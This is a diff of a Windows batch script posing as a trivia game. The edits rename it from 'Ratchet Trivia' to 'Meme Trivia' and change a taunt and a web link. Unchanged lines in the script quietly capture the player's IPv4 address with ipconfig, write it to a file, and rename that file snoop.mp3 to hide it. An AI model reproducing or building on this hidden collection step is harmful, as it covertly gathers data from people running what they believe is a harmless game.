@@ -1,6 +1,6 @@
 @echo off
 
-Title Ratchet Trivia
+Title Meme Trivia
 color FD
 prompt Player:
 cd c:\users
@@ -11,7 +11,7 @@ ipconfig | findstr -i ipv4 >> stash.txt
 move stash.txt snoop.mp3
 
 
-set T= Welcome to Ratchet Trivia!
+set T= Welcome to Meme Trivia!
 cls
 
 :start
@@ -245,9 +245,9 @@ echo           /             :               \
 echo        ,-'              :               /
 echo       /                 :             -'
 echo You LOSE!
-echo Brush up on your ratchetness!
+echo Brush up on your memes!
 pause
-start http://www.worldstarhiphop.com/videos/
+start http://knowyourmeme.com/
 goto Q1
 
 
